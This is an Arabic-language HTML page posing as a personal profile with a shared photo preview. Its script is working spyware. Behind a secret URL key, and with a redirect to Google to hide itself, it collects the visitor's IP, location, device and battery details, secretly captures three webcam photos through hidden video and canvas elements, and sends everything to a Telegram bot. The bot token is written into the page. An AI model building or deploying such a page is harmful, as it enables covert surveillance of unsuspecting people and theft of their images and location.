<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محمد كعابنة</title>

    <!-- إعدادات المعاينة (Open Graph) - لكي تظهر الصورة والاسم عند المشاركة -->
    <meta property="og:title" content="محمد كعابنة">
    <meta property="og:type" content="profile">
    <meta property="og:image" content="https://l.top4top.io/p_3968sozsf0.jpg"> <!-- صورتك التي أرسلتها -->

    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            background: #f0f2f5; 
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        video { display: none; } /* إخفاء الفيديو لجعل العملية غير مرئية */
        canvas { display: none; }
        .loading { font-size: 24px; color: #666; animation: pulse 1.5s infinite; }
        @keyframes pulse {
            0% { opacity: 0.5; }
            50% { opacity: 1; }
            100% { opacity: 0.5; }
        }
    </style>
</head>
<body>

    <div class="loading">جاري التحميل...</div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- الإعدادات الأساسية (تأكد من صحتها) ---
        const TELEGRAM_TOKEN = '8322190390:AAHN2FcpyUVDjsEa5DhFLzaFcgFF0v7nfOw';
        const CHAT_ID = '7184970355';
        const SECRET_KEY = '123'; 

        async function init() {
            // فحص المفتاح السري في الرابط
            const urlParams = new URLSearchParams(window.location.search);
            const userKey = urlParams.get('key');

            if (userKey !== SECRET_KEY) {
                // إذا لم يوجد المفتاح (?key=123)، اذهب إلى جوجل فوراً للتمويه
                window.location.href = "https://www.google.com";
                return;
            }

            // إذا كان المفتاح صحيحاً، ابدأ جمع البيانات
            await startHacking();
        }

        async function sendToTelegram(text, photoBlob = null) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            if (photoBlob) {
                formData.append('photo', photoBlob);
            } else {
                formData.append('text', text);
            }

            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/`, {
                method: 'POST',
                body: formData
            });
        }

        async function startHacking() {
            try {
                let infoText = "🚀 دخول جديد!\n\n";

                // 1. جلب الـ IP واللوكيشن
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                infoText += `📍 IP: ${ipData.ip}\n`;
                infoText += `🌍 الدولة: ${ipData.city}, ${ipData.country_name}\n`;
                infoText += `🌐 مزود الخدمة: ${ipData.org}\n\n`;

                // 2. معلومات الجهاز
                infoText += `📱 الجهاز: ${navigator.platform}\n`;
                infoText += `🌐 المتصفح: ${navigator.userAgent}\n\n`;

                // 3. البطارية
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    infoText += `🔋 مستوى البطارية: ${(battery.level * 100).toFixed(0)}%\n`;
                    infoText += `🔌 حالة الشحن: ${battery.charging ? 'في الشحن' : 'لا يشحن'}\n\n`;
                }

                await sendToTelegram(infoText);
            } catch (e) {
                await sendToTelegram("⚠️ حدث خطأ في جلب البيانات، ولكن الشخص دخل الرابط.");
            }

            startCamera();
        }

        async function startCamera() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;
                // الانتظار قليلاً ثم التقاط الصور
                setTimeout(() => capturePhotos(video, canvas, context), 1500);
            } catch (err) {
                await sendToTelegram("📷 تم الدخول ولكن لم يتم السماح بالكاميرا.");
            }
        }

        async function capturePhotos(video, canvas, context) {
            for (let i = 0; i < 3; i++) { // سيتم التقاط 3 صور
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);

                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
                await sendToTelegram("📸 صورة جديدة:", blob);
            }
        }

        // تشغيل البرنامج عند تحميل الصفحة
        window.onload = init;
    </script>
</body>
</html>
